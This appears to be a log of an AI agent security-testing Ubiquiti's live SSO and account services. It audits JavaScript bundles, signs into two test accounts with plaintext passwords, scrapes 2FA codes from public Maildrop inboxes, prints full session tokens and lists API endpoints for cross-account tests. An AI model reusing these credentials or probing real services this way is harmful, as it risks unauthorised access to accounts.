+{let e=new URL(`${window.location.origin}${IT(`support`,void 0,{support:!0})}`);window.open(e,`_blank`,`noopener,noreferrer`);return}if(!t)return;let n=document.getElementById($G);(await window.adaEmbed.getInfo()).isDrawerOpen||wind
+[0m
+[0m$ [0mcd /tmp/s34
+python3 - <<'PY'
+import re
+s=open('account.js',encoding='utf-8',errors='replace').read()
+for needle in ['n7=e=>','vBt=','p_t=']:
+    i=s.find(needle)
+    print('=== ',needle,' at',i,' ===')
+    if i>=0:
+        print(s[i-200:i+700])
+    print()
+PY
+===  n7=e=>  at 6504244  ===
+h]:(0,I.jsx)(dBt,{setOtherMethodsView:o,setDefaultEmailView:s}),[D5.all]:(0,I.jsx)(Hzt,{setMfaState:a})})[r],[i,r,s]);return(0,I.jsx)(V0,{children:(0,I.jsx)(Z$,{hideLogo:!0,padding:24,children:c})})},n7=e=>{let t=new URLSearchParams(window.location.search).get(e);if(t!==null)return t;let n=window.location.hash,r=n.indexOf(`?`);return r===-1?null:new URLSearchParams(n.slice(r+1)).get(e)},vBt=()=>((0,F.useEffect)(()=>{let e={type:p_t,status:n7(`status`),idpId:n7(`idpId`),message:n7(`message`)};if(window.opener&&!window.opener.closed){try{window.opener.postMessage(e,window.location.origin)}catch{}window.close()}else window.location.replace(`/#profile`)},[]),null),yBt=e=>setTimeout(()=>{window.location.href=e},2e3),bBt=()=>{let[e,t]=(0,F.useState)(null),{subscriptionId:n,url:r,region:i}=KSt();return(0,F.useEffect)(()=>{n&&i&&r||e||t(`ERROR_SOMETHING_WENT_WRONG`)},[e,i,n,r]),(0,F.useEffect)((
+
+===  vBt=  at 6504434  ===
+en:c})})},n7=e=>{let t=new URLSearchParams(window.location.search).get(e);if(t!==null)return t;let n=window.location.hash,r=n.indexOf(`?`);return r===-1?null:new URLSearchParams(n.slice(r+1)).get(e)},vBt=()=>((0,F.useEffect)(()=>{let e={type:p_t,status:n7(`status`),idpId:n7(`idpId`),message:n7(`message`)};if(window.opener&&!window.opener.closed){try{window.opener.postMessage(e,window.location.origin)}catch{}window.close()}else window.location.replace(`/#profile`)},[]),null),yBt=e=>setTimeout(()=>{window.location.href=e},2e3),bBt=()=>{let[e,t]=(0,F.useState)(null),{subscriptionId:n,url:r,region:i}=KSt();return(0,F.useEffect)(()=>{n&&i&&r||e||t(`ERROR_SOMETHING_WENT_WRONG`)},[e,i,n,r]),(0,F.useEffect)(()=>{(async()=>{try{if(!n||!i||!r)return;let e=(await qSt(n,i))[i].latest_invoice?.payment_intent;if(e?.status===`requires_action`){let n=e?.client_secret,a=e?.payment_method??e?.source;if(!n
+
+===  p_t=  at 5651799  ===
+N_CANCEL`})})]}),e.status===B2.CONFIG_FAILED&&(0,I.jsx)(K,{variant:`caption`,color:`red-06`,children:(0,I.jsx)(q,{id:`PROFILE_ORGANIZATION_IDP_SETUP_CONFIG_FAILED`,values:{idp:L4[e.provider]}})})]})},p_t=`msp-idp-setup-result`,q4=`${window.location.origin}/msp/idp/setup-result`,J4=700,Y4=700,m_t=500,h_t=()=>{if(typeof window>`u`)return{left:0,top:0};let e=window.screenLeft??window.screenX??0,t=window.screenTop??window.screenY??0,n=window.outerWidth||window.innerWidth||J4,r=window.outerHeight||window.innerHeight||Y4;return{left:Math.round(e+(n-J4)/2),top:Math.round(t+(r-Y4)/2)}},g_t=({left:e,top:t})=>`width=${J4},height=${Y4},left=${e},top=${t},menubar=no,toolbar=no,location=yes,resizable=yes,scrollbars=yes`,__t=e=>e===B2.CONFIGURED||e===B2.CONFIGURING||e===B2.SYNCING||e===B2.ACTIVE,v_t=()=>{let e=jh(),{errorToast:t,successToast:n}=K0(),r=(0,F.useRef)(null),i=(0,F.useRef)(null),[a,o]=(0,F
+[0m
+[0m$ [0mcd /tmp/s34
+python3 - <<'PY'
+s=open('account.js',encoding='utf-8',errors='replace').read()
+for needle in ['yBt(','yBt,','yBt)']:
+    idx=0
+    while True:
+        i=s.find(needle,idx)
+        if i<0: break
+        print('=== ',needle,'at',i,' ===')
+        print(s[max(0,i-350):i+250])
+        print()
+        idx=i+1
+PY
+===  yBt( at 6505526  ===
+);await JSt(i,r,n,a);return}if(e?.status===`succeeded`||e?.status===`processing`){window.location.href=r;return}t(`ERROR_SOMETHING_WENT_WRONG`)}catch(e){return Ac(e,{level:`error`,extra:{context:`Failed to complete 3DS validation`,region:i,subscriptionId:n}}),t(`ERROR_SOMETHING_WENT_WRONG`)}})()},[i,n,r]),(0,F.useEffect)(()=>{let t;return r&&e&&(t=yBt(r)),()=>t&&clearTimeout(t)},[e,r]),(0,I.jsx)(xBt,{children:e?(0,I.jsxs)(I.Fragment,{children:[(0,I.jsx)(bI,{variant:`flat`,size:72}),(0,I.jsx)(K,{color:`text-1`,variant:`heading-large`,children:(0,I.jsx)(q,{id:e})}),(0,I.jsx)(K,{color:`text-1`,va
+[0m
+The `yBt`/`vBt` sinks are the fixed 3DS/MSP-IdP flows (already documented). Now doing a fresh Account A login to test authenticated surface.
+[0m$ [0mcd /tmp/s34
+UA="Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
+rm -f A.jar
+echo "=== password step ==="
+curl -sS --max-time 25 -c A.jar -A "$UA" -H 'Content-Type: application/json' -H 'Origin: https://account.ui.com' -H 'Referer: https://account.ui.com/' \
+  -X POST https://sso.ui.com/api/sso/v1/login \
+  --data '{"user":"tan.tiger5564@maildrop.cc","password":"Acd3423@#345","remember_me":true}' \
+  -D login-headers.txt -o login-body.txt
+echo "--- status/body ---"; head -1 login-headers.txt; cat login-body.txt; echo
+echo "--- cookies ---"; grep -iE 'UBIC|ACCOUNT_CHOOSER' A.jar || true
+echo
+echo "=== maildrop inbox ==="
+curl -sS --max-time 25 -H 'Content-Type: application/json' -X POST https://api.maildrop.cc/graphql \
+  --data '{"query":"query { inbox(mailbox:\"tan.tiger5564\") { id subject date } }"}' -o inbox.json
+cat inbox.json | python3 -c 'import sys,json; d=json.load(sys.stdin); [print(m["id"],m["date"],m["subject"]) for m in (d.get("data",{}).get("inbox") or [])[:6]]' 2>/dev/null || cat inbox.json | head -c 800
+=== password step ===
+--- status/body ---
+HTTP/2 499 
+{"required":"2fa","authenticators":[{"id":"ae514c45-64ea-46cf-a444-e86c845282e7","created":"2026-11-10T16:11:56.400613Z","last_success":null,"type":"backup_code","status":"backup","codes_left":10},{"id":"b82c4c7d-f733-44c1-b6db-ffa6d5f8183b","created":"2025-01-12T17:14:04.887943Z","last_success":"2026-11-27T21:02:45.816193Z","type":"email","status":"active","blocked_reason":null,"email":"ta·········64@maildrop.cc"}],"publicKeyCredentialRequestOptions":{"challenge":"U3hmYnRZRkJ6VzVscXpvNkNVTTJ6RmxmcjNfaTg3UVgxejNlU3BNcDVpYw","timeout":60000,"rpId":"ui.com","allowCredentials":[],"userVerification":"preferred"},"user":{"default_mfa":"b82c4c7d-f733-44c1-b6db-ffa6d5f8183b","id":"d8946fad-2b8e-4cf0-82c5-5d955b57b829"}}
+--- cookies ---
+#HttpOnly_.sso.ui.com	TRUE	/	TRUE	1801035018	ACCOUNT_CHOOSER	fjIwMjUwOTMwfFZ3ckQ0cEF2QllDQWhtbW12NGxxNkd1eVFSYnRLT1dxQ2doSlJyVVZ6c3FLanBtWC80MHZXMFlYY2grYVFjUzY3TWpDdEZKNWtuMmtZVWFkVFlIdmRKRFVmZ09XamdIVWtzTTFkUnljc0pMUEEzSnFLSEVnM0lZQ29Uc3psQWVkV005UFVpNmVQV1FkT1EyanMyeUJ3aGV1WDFJbDM3TmhKQVhHeUtwQVhSalRUMEJidENQK2N0Y1dsWE9FVXc9PXxxRHBkSUVuQXFGL0hRKzJZVmRpa2V1aFYrMVE9fG93UElSUzFYZzZkaEEyWkg3NkM5K0E9PXx3OGxUdGFvalBRNzBCRHJwZngvcy9jQTdZUU09
+#HttpOnly_.ui.com	TRUE	/	TRUE	1795851618	UBIC_2FA	eyJhbGciOiJSUzI1NiIsImtpZCI6Ik1lU1hTck1EeDhXb3dqSDZWVjNDWGJoa2JmTktSNmMxbThfVVNfZEFKX0kiLCJ0eXAiOiJKV1QifQ.eyIyZmFfdXNlcl9pZCI6ImQ4OTQ2ZmFkLTJiOGUtNGNmMC04MmM1LTVkOTU1YjU3YjgyOSIsImV4cGlyeSI6MTc5NTg1MTYxOCwic2Vzc2lvbiI6IjBkYmIxMzRkLTkwODctNGM5MS1hMmQzLWQwMWY1MTE5YTQyMCIsInN1YiI6ImQ4OTQ2ZmFkLTJiOGUtNGNmMC04MmM1LTVkOTU1YjU3YjgyOSIsImlzcyI6Imh0dHBzOi8vc3NvLnVpLmNvbSIsImV4cCI6MTc5NTg1MTYxOH0.XVvinAm7VcpcrtaGZ0iGF-wPcEYsX1L_bZh40mgEY9DpSF9-ZebgAE4BQLMbc4ZfyE7cI6DTBTxk5a1-q6X3FpFu5LAeh0iyo7W2bP752-1qckTwbKfwTxm8x6VG4jZjSm4zrODTQlZT732-NFucLu70zn48kmdGnLwjZFK-0olQcJXlwm3WWwXuK_yHymAVYYtN9p2jJIYuR8O_vwh-B7II0VMEtppu3qkvvOHrpY0vNfk77DWQDYijCha9hJWRQeu4qOy2hHeVfqLfKBkJi70PmDBLA7bXmjre_pb9HDUCcVKlsXM3SEL4s95lKjS_WAb3lO4M4L5hjlL74T3Me-UcyShE0Kn5dbnKRy7CqIrQGBj0Jw5kpoVGRqLwWm4B3Gk4yKvHZM6Sjhgn7kXms13XPjus2xdHRiWnunSb_ZGqvVM5C5wDWWdcKTpLD7lZRm0G9ENkQ43TKR9IF8kVmG1fy2eXut322fuTzQXTVSfPFrgPmuAs7y-V-yYGJLk_JCTRCFjaaOvjgrp7CYptY9rUg_bT9bDEjrKtP2HQf3qAlMLeKuRJh83UA_3rRnliNRKMyD25y3B7KMwsOpNVu8d7fROtMjDSdFnR6bFxzcRrQ-u8QXtWJhgalRpD0i3e14ZcrBpNLMe6ck5EYZXIOSlI1jvPndCdTayBJ_AgITw
+
+=== maildrop inbox ===
+[0m
+[0m$ [0mcd /tmp/s34
+echo "=== raw inbox ==="; head -c 1000 inbox.json; echo
+UA="Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
+echo "=== trigger email OTP send ==="
+curl -sS --max-time 25 -b A.jar -c A.jar -A "$UA" -H 'Content-Type: application/json' -H 'Origin: https://account.ui.com' \
+  -X POST 'https://sso.ui.com/api/sso/v2/user/self/mfa/email/b82c4c7d-f733-44c1-b6db-ffa6d5f8183b/send' \
+  --data '{}' -D send-h.txt -o send-b.txt
+head -1 send-h.txt; cat send-b.txt; echo
+sleep 8
+curl -sS --max-time 25 -H 'Content-Type: application/json' -X POST https://api.maildrop.cc/graphql \
+  --data '{"query":"query { inbox(mailbox:\"tan.tiger5564\") { id subject date } }"}' -o inbox2.json
+head -c 1500 inbox2.json
+=== raw inbox ===
+{"data":{"inbox":[]}}
+
+=== trigger email OTP send ===
+HTTP/2 200 
+{"id":"b82c4c7d-f733-44c1-b6db-ffa6d5f8183b","created":"2025-01-12T17:14:04.887943Z","last_success":"2026-11-27T21:02:45.816193Z","type":"email","status":"active","blocked_reason":null,"otp_prefix":"SU","email":"tan.tiger5564@maildrop.cc"}
+{"data":{"inbox":[{"id":"N8ubNofOy3","subject":"MFA Login Authentication","date":"2026-11-28T07:30:26.159Z"},{"id":"OW6E7CEtAb","subject":"MFA Login Authentication","date":"2026-11-28T07:30:19.830Z"}]}}
+[0m
+[0m$ [0mcd /tmp/s34
+UA="Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
+curl -sS --max-time 25 -H 'Content-Type: application/json' -X POST https://api.maildrop.cc/graphql \
+  --data '{"query":"query { message(mailbox:\"tan.tiger5564\", id:\"N8ubNofOy3\") { html } }"}' -o msg.json
+python3 - <<'PY'
+import json,re,html
+d=json.load(open('/tmp/s34/msg.json'))
+h=d.get('data',{}).get('message',{}).get('html','')
+txt=re.sub('<[^>]+>',' ',h)
+codes=re.findall(r'\b(\d{6})\b',html.unescape(txt))
+print('codes:',codes)
+open('/tmp/s34/otp.txt','w').write(codes[0] if codes else '')
+PY
+OTP=$(cat otp.txt); echo "OTP=$OTP"
+echo "=== submit 2fa ==="
+curl -sS --max-time 25 -b A.jar -c A.jar -A "$UA" -H 'Content-Type: application/json' -H 'Origin: https://account.ui.com' -H 'Referer: https://account.ui.com/login/2fa' \
+  -X POST https://sso.ui.com/api/sso/v1/login/2fa --data "{\"token\":\"$OTP\"}" -D twofa-h.txt -o twofa-b.txt
+head -1 twofa-h.txt; cat twofa-b.txt; echo
+echo "=== cookies ==="; grep -iE 'UBIC_AUTH' A.jar | sed -E 's/(UBIC_AUTH\t).*/\1<present>/'
+echo "=== validate /user/self ==="
+curl -sS --max-time 20 -b A.jar -A "$UA" https://sso.ui.com/api/sso/v1/user/self -o self.json -w "%{http_code}\n"
+python3 -c 'import json;d=json.load(open("/tmp/s34/self.json"));print({k:d.get(k) for k in ("uuid","username","email","is_verified","email_verified")})' 2>/dev/null || head -c 400 self.json
+codes: ['222225', '181494', '181494']
+OTP=222225
+=== submit 2fa ===
+HTTP/2 403 
+{"detail":"Invalid credential","error":"INVALID_CREDENTIAL"}
+=== cookies ===
+=== validate /user/self ===
+401
+ is not allowed
+[0m
+[0m$ [0mcd /tmp/s34
+python3 - <<'PY'
+import json,re,html
+d=json.load(open('msg.json'))
+h=d.get('data',{}).get('message',{}).get('html','')
+txt=html.unescape(re.sub('<[^>]+>',' ',h))
+txt=re.sub(r'\s+',' ',txt)
+print(txt[:1200])
+print('---digit contexts---')
+for m in re.finditer(r'\d{4,8}', txt):
+    print(repr(txt[max(0,m.start()-40):m.end()+20]))
+PY
+MFA Login Authentication @keyframes onAutoFillCancel__SoIxNNPh{0%{border-color:#0000}to{border-color:#0000}}body{margin:0}.opooD{-webkit-text-size-adjust:100%;-moz-text-size-adjust:100%;text-size-adjust:100%;table-layout:fixed;text-align:center;color:#222225;width:100%;max-width:448px;margin:0 auto;font-family:UI Sans,Lato,sans-serif;font-size:14px}.opooD td{font-family:UI Sans,Lato,sans-serif}.opooD:first-of-type{padding:36px 0 0}.opooD:last-of-type{padding:0 0 20px}.cyzlB{color:#006fff;text-decoration:none}.hegTwU{border:1px solid #dbdce1;border-radius:20px;padding:36px 48px}.jewrbq{padding:0}.jzIObo{margin:16px 0 24px;font-size:28px;font-weight:700;line-height:36px}.iXAkUH{text-align:left;color:#000000a6;margin-top:0;margin-bottom:40px;font-size:14px;line-height:1.6}.iXAkUH:last-child{margin-bottom:0}.iXAkUH.center{text-align:center}.bYXydw{color:#000;background:#f9fafa;border-radius:20px;width:100%;padding:0}.egVrQy{border-spacing:0;width:100%}.egVrQy td.icon{border-right:1px solid #eeeef1;padding:8px}.BCYER{padding:0}.BCYER .Footer__Pill-sc-1sqcetw-1 td.text,.BCYER .Text__Paragraph-sc-r7gvvb-2{font-size:12px;font-weight:400;line-height:20px}.kBQMes{border-top:1px solid #c4c4c
+---digit contexts---
+'toFillCancel__SoIxNNPh{0%{border-color:#0000}to{border-color:#00'
+'{0%{border-color:#0000}to{border-color:#0000}}body{margin:0}.opo'
+'e-layout:fixed;text-align:center;color:#222225;width:100%;max-widt'
+'ght:36px}.iXAkUH{text-align:left;color:#000000a6;margin-top:0;marg'
+'font-face{font-family:UI Sans;src:url(/d7019e3f094281c4a83f13c89'
+'ce{font-family:UI Sans;src:url(/d7019e3f094281c4a83f13c89aa296d6.w'
+'font-face{font-family:UI Sans;src:url(/d7019e3f094281c4a83f13c89'
+'ce{font-family:UI Sans;src:url(/d7019e3f094281c4a83f13c89aa296d6.w'
+'font-face{font-family:UI Sans;src:url(/d7019e3f094281c4a83f13c89'
+'ce{font-family:UI Sans;src:url(/d7019e3f094281c4a83f13c89aa296d6.w'
+'-face{font-family:UI Sans;src:url(/e085d59692047f480cde1d16b4405eb5.'
+' Sans;src:url(/e085d59692047f480cde1d16b4405eb5.woff2)format("wo'
+'-face{font-family:UI Sans;src:url(/e085d59692047f480cde1d16b4405eb5.'
+' Sans;src:url(/e085d59692047f480cde1d16b4405eb5.woff2)format("wo'
+'ly:UI Sans;src:url(/238cddd6e362e0c759bc57780e121515.woff2)format'
+'Sans;src:url(/238cddd6e362e0c759bc57780e121515.woff2)format("woff2'
+'@font-face{font-family:UI Sans;src:url(/92226d3e42373670f23ea76b9'
+'ce{font-family:UI Sans;src:url(/92226d3e42373670f23ea76b98b619ba.wof'
+'@font-face{font-family:UI Sans;src:url(/92226d3e42373670f23ea76b9'
+'ce{font-family:UI Sans;src:url(/92226d3e42373670f23ea76b98b619ba.wof'
+'ap} Your Ubiquiti verification code is: 181494 MFA Login Authentic'
+'e your Ubiquiti SSO login attempt. SU - 181494 The code will remai'
+'ce, please contact Ubiquiti support . © 2026 Ubiquiti, Inc. All '
+'s Reserved. 685 Third Ave. New York, NY 10017 '
+[0m
+[0m$ [0mcd /tmp/s34
+UA="Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
+curl -sS --max-time 25 -b A.jar -c A.jar -A "$UA" -H 'Content-Type: application/json' -H 'Origin: https://account.ui.com' -H 'Referer: https://account.ui.com/login/2fa' \
+  -X POST https://sso.ui.com/api/sso/v1/login/2fa --data '{"token":"181494"}' -D twofa-h.txt -o twofa-b.txt
+head -1 twofa-h.txt; head -c 400 twofa-b.txt; echo
+echo "=== cookies ==="; grep -iE 'UBIC_AUTH' A.jar | sed -E 's/(UBIC_AUTH\t).*/\1<present>/'
+echo "=== validate /user/self ==="
+curl -sS --max-time 20 -b A.jar -A "$UA" https://sso.ui.com/api/sso/v1/user/self -o self.json -w "%{http_code}\n"
+python3 -c 'import json;d=json.load(open("/tmp/s34/self.json"));print({k:d.get(k) for k in ("uuid","username","email","is_verified","email_verified")})' 2>/dev/null || head -c 400 self.json
+HTTP/2 200 
+{"username":"testttt12","email":"tan.tiger5564@maildrop.cc","curr_terms_rev":"REV2013-01-18","curr_privacy_rev":"REV2013-01-18","curr_terms_aircrm_rev":"REV2015-05-19","session_ttl_seconds":null,"is_verified":true,"twofa_enabled":true,"last_login":"2026-11-27T21:02:45.918013Z","first_name":"OpenCodeTest","ivr":"1754448789","mailinglist":true,"share_usage":false,"picture":"https://account-cdn.svc.u
+=== cookies ===
+#HttpOnly_.ui.com	TRUE	/	TRUE	1798443048	UBIC_AUTH	<present>
+=== validate /user/self ===
+200
+{'uuid': 'd8946fad-2b8e-4cf0-82c5-5d955b57b829', 'username': 'testttt12', 'email': 'tan.tiger5564@maildrop.cc', 'is_verified': True, 'email_verified': None}
+[0m
+Account A session active. Now obtaining Account B for cross-account tests.
+[0m$ [0mcd /tmp/s34
+UA="Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
+rm -f B.jar
+curl -sS --max-time 25 -c B.jar -A "$UA" -H 'Content-Type: application/json' -H 'Origin: https://account.ui.com' -H 'Referer: https://account.ui.com/' \
+  -X POST https://sso.ui.com/api/sso/v1/login \
+  --data '{"user":"overrated.chinchilla337@maildrop.cc","password":"Acd3423@#345","remember_me":true}' -o loginB.json -w "%{http_code}\n"
+python3 -c 'import json;d=json.load(open("/tmp/s34/loginB.json"));print("uuid",d.get("user",{}).get("id"));print("auth",[(a["id"],a["type"],a.get("status")) for a in d.get("authenticators",[])])' 2>/dev/null || head -c 500 loginB.json
+499
+uuid 7c5aab2b-e568-40de-a7a5-ec27df1db94b
+auth [('a646df96-8e23-4a05-8251-01f4e0a1aa0e', 'email', 'active'), ('b2657807-2704-44e4-bdc6-196a55c38cde', 'totp', 'active')]
+[0m
+[0m$ [0mcd /tmp/s34
+UA="Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
+curl -sS --max-time 25 -b B.jar -c B.jar -A "$UA" -H 'Content-Type: application/json' -H 'Origin: https://account.ui.com' \
+  -X POST 'https://sso.ui.com/api/sso/v2/user/self/mfa/email/a646df96-8e23-4a05-8251-01f4e0a1aa0e/send' --data '{}' -o sendB.json -w "%{http_code}\n"
+head -c 300 sendB.json; echo
+sleep 8
+curl -sS --max-time 25 -H 'Content-Type: application/json' -X POST https://api.maildrop.cc/graphql \
+  --data '{"query":"query { inbox(mailbox:\"overrated.chinchilla337\") { id subject date } }"}' -o inboxB.json
+head -c 800 inboxB.json
+200
+{"id":"a646df96-8e23-4a05-8251-01f4e0a1aa0e","created":"2026-10-30T06:25:57.987565Z","last_success":"2026-11-13T06:28:00.884775Z","type":"email","status":"active","blocked_reason":null,"otp_prefix":"ON","email":"overrated.chinchilla337@maildrop.cc"}
+{"data":{"inbox":[{"id":"MgNzIN2mby","subject":"MFA Login Authentication","date":"2026-11-28T07:30:57.613Z"}]}}
+[0m
+[0m$ [0mcd /tmp/s34
+UA="Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
+curl -sS --max-time 25 -H 'Content-Type: application/json' -X POST https://api.maildrop.cc/graphql \
+  --data '{"query":"query { message(mailbox:\"overrated.chinchilla337\", id:\"MgNzIN2mby\") { html } }"}' -o msgB.json
+OTPB=$(python3 - <<'PY'
+import json,re,html
+d=json.load(open('/tmp/s34/msgB.json'))
+h=d.get('data',{}).get('message',{}).get('html','')
+txt=html.unescape(re.sub('<[^>]+>',' ',h))
+m=re.search(r'verification code is:\s*(\d{6})',txt) or re.search(r'\b(\d{6})\b',txt)
+print(m.group(1) if m else '')
+PY
+)
+echo "B OTP=$OTPB"
+curl -sS --max-time 25 -b B.jar -c B.jar -A "$UA" -H 'Content-Type: application/json' -H 'Origin: https://account.ui.com' -H 'Referer: https://account.ui.com/login/2fa' \
+  -X POST https://sso.ui.com/api/sso/v1/login/2fa --data "{\"token\":\"$OTPB\"}" -o twofaB.json -w "%{http_code}\n"
+head -c 200 twofaB.json; echo
+curl -sS --max-time 20 -b B.jar -A "$UA" https://sso.ui.com/api/sso/v1/user/self -o selfB.json -w "B /user/self: %{http_code}\n"
+python3 -c 'import json;d=json.load(open("/tmp/s34/selfB.json"));print(d.get("uuid"),d.get("username"),d.get("email"))' 2>/dev/null || head -c 200 selfB.json
+B OTP=193193
+200
+{"username":"test-account-b","email":"overrated.chinchilla337@maildrop.cc","curr_terms_rev":"REV2013-01-18","curr_privacy_rev":"REV2013-01-18","session_ttl_seconds":2592000,"is_verified":true,"twofa_e
+B /user/self: 200
+7c5aab2b-e568-40de-a7a5-ec27df1db94b test-account-b overrated.chinchilla337@maildrop.cc
+[0m
+Both sessions active. Checking the Site Manager build and recording a progress checkpoint.
+[0m$ [0mcd /home/runner/work/aaii-aautomattionn-for-doomainn/aaii-aautomattionn-for-doomainn
+cat >> result/progress.md <<'EOF'
+
+## Session 34 (2026-11-28T07:30Z) — continuation; www new deploy, fresh A/B sessions
+- Build deltas: `account.ui.com` unchanged `index-D7cQ-F1j.js` (sha256
+  `f75b4c9c...303a`, same as S33). `www.ui.com` REDEPLOYED
+  `dpl=d6fbc335af54cb2739a6c9ebd9f765dc52426e14` (was `e1f4c3c3...`).
+  `activate.ui.com` unchanged `index-1CNh1WqS.js`.
+- www new deploy: 36 initial chunks audited. Sinks: 28 `dangerouslySetInnerHTML`
+  (React/Next internals + static i18n; app uses same `02aqcd17vx73t.js` route
+  allowlist), 7 `.innerHTML=` (React/GTM/SendSafely internals). Only query params
+  consumed are `appview` + Next RSC internals; no new URL source→sink. Download
+  `?link=` allowlist chunk `3qz-ufud26idy.js` unchanged (https + dl.ubnt.com/
+  dl.ui.com/fw-download.ubnt.com). Client-side: Not Vulnerable.
+- Fresh Account A + Account B sessions established end-to-end (password -> email
+  OTP via Maildrop GraphQL -> `/login/2fa` 200 -> `UBIC_AUTH`); `/user/self` 200 for
+  both. (Tokens not copied into files.)
+- Ongoing: Site Manager bundle check + targeted untested-endpoint tests.
+EOF
+echo written
+written
+[0m
+[0m$ [0mcd /tmp/s34
+UA="Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
+curl -sS --max-time 25 -b A.jar -A "$UA" https://unifi.ui.com/ -o unifiA.html -w "%{http_code} %{size_download}\n"
+echo "=== bundle refs ==="
+grep -oE '(main-[0-9]+\.[a-f0-9]+\.js|main-[0-9]+\.[a-z0-9]+\.js|runtime\.[a-z0-9]+\.js|[A-Za-z0-9_.-]+\.chunk\.js)' unifiA.html | sort -u | head -30
+echo "=== all script srcs ==="
+grep -oE 'src="[^"]+\.js"' unifiA.html | head -30
+echo "=== title/len ==="
+grep -oE '<title>[^<]*</title>' unifiA.html | head -1
+200 1496
+=== bundle refs ===
+main-0.b06362b80fbfc61f.js
+main-2.eba48672e7900466.js
+main-3.c985b107b1cd0d65.js
+main-4.accbf103e39260b1.js
+main-5.7eea6243bb2f01b0.js
+main-6.69ee33a3f81f17c5.js
+main-7.8d401a13358c5b3e.js
+runtime.393f084b414f2652.js
+=== all script srcs ===
+src="/runtime.393f084b414f2652.js"
+src="/7962.4ecb9ae54a7fdb2b.js"
+src="/6934.1c5fbe60352dabb9.js"
+src="/925.208f351703b34dd4.js"
+src="/3136.69f4989f999f2921.js"
+src="/5331.24d484a682317e0f.js"
+src="/683.66bb5200e8e12416.js"
+src="/1336.f252ebd61ec572ec.js"
+src="/main-0.b06362b80fbfc61f.js"
+src="/main-2.eba48672e7900466.js"
+src="/main-3.c985b107b1cd0d65.js"
+src="/main-4.accbf103e39260b1.js"
+src="/main-5.7eea6243bb2f01b0.js"
+src="/main-6.69ee33a3f81f17c5.js"
+src="/main-7.8d401a13358c5b3e.js"
+=== title/len ===
+<title>UniFi Site Manager</title>
+[0m
+Site Manager build unchanged. Extracting the current account API path list to find any untested in-scope endpoint.
+[0m$ [0mcd /tmp/s34
+python3 - <<'PY'
+import re
+s=open('account.js',encoding='utf-8',errors='replace').read()
+# find path literals starting with /api/ or /v1 /v2 etc, and cloudaccess/account.svc style
+paths=set()
+for m in re.finditer(r'`([^`\\]{2,120})`', s):
+    t=m.group(1)
+    if re.match(r'^/(api|v1|v2|user|zendesk|chat|devices|invitations|sites|hosts|create-credentials|confirm-invitation)', t):
+        paths.add(t)
+for m in re.finditer(r'"([^"\\]{2,120})"', s):
+    t=m.group(1)
+    if re.match(r'^/(api|v1|v2|user|zendesk|chat|devices|invitations|sites|hosts|create-credentials|confirm-invitation)', t):
+        paths.add(t)
+for p in sorted(paths):
+    print(p)
+print('TOTAL', len(paths))
+PY
+/api/fabrics/base/msp/v1/idp
+/api/fabrics/base/msp/v1/idp/configuration
+/api/fabrics/base/msp/v1/idp/credentials
+/api/fabrics/base/msp/v1/idp/domain/verify
+/api/fabrics/base/msp/v1/idp/rebind
+/api/fabrics/base/msp/v1/idp/retry-configure
+/api/fabrics/base/msp/v1/idp/scim-token
+/api/fabrics/base/msp/v1/idp/scim-token/regenerate
+/api/fabrics/base/msp/v1/idp/sync
+/api/fabrics/base/msp/v1/idp/sync-jobs/{jobId}
+/api/fabrics/base/msp/v1/idp/sync-targets
+/api/fabrics/base/msp/v1/logo
+/api/fabrics/base/msp/v1/msp
+/api/fabrics/base/msp/v1/msp/idp-enforcement
+/api/fabrics/base/msp/v2/idp/directory/groups
+/api/sso/v1/account-chooser
+/api/sso/v1/address/validator
+/api/sso/v1/idp/login-result
+/api/sso/v1/legacy/user/self/email
+/api/sso/v1/legacy/user/self/email/send
+/api/sso/v1/legal
+/api/sso/v1/login
+/api/sso/v1/login/2fa
+/api/sso/v1/login/email
+/api/sso/v1/logout
+/api/sso/v1/password
+/api/sso/v1/password-strength
+/api/sso/v1/passwordless/login
+/api/sso/v1/passwordless/options
+/api/sso/v1/search/email
+/api/sso/v1/search/username
+/api/sso/v1/shopify_login
+/api/sso/v1/suspicious/confirm
+/api/sso/v1/suspicious/confirm/inspect
+/api/sso/v1/user/self
+/api/sso/v1/user/self/2fa
+/api/sso/v1/user/self/2fa/backup
+/api/sso/v1/user/self/2fa/reset
+/api/sso/v1/user/self/activity
+/api/sso/v1/user/self/addresses
+/api/sso/v1/user/self/device
+/api/sso/v1/user/self/email/verify/send
+/api/sso/v1/user/self/login/level
+/api/sso/v1/user/self/login/level/refresh
+/api/sso/v1/user/self/mfa
+/api/sso/v1/user/self/picture
+/api/sso/v1/user/self/roles
+/api/sso/v1/user/self/sessions
+/api/sso/v1/user/self/settings
+/api/sso/v1/user/self/trusted_devices
+/api/sso/v1/user/self/zendesk_user
+/api/sso/v1/user/{uuid}/roles/beta
+/api/sso/v1/verify
+/api/sso/v1/verify/password
+/api/sso/v1/verify/verification-code
+/api/sso/v2/password-strength
+/api/sso/v2/user/self/mfa/email/{id}/send
+/api/sso/v2/users
+/api/v1/devices/integrations/ssoa
+/api/v1/esim/devices
+/api/v1/esim/orders
+/api/v1/esim/plans
+/api/v1/esim/renewals
+/api/v1/hosts
+/api/v1/licenseCodes/validation
+/api/v1/msps/subscriptions
+/api/v1/organizations
+/api/v1/organizations/{orgId}/billing/v2/customers/self/invoices
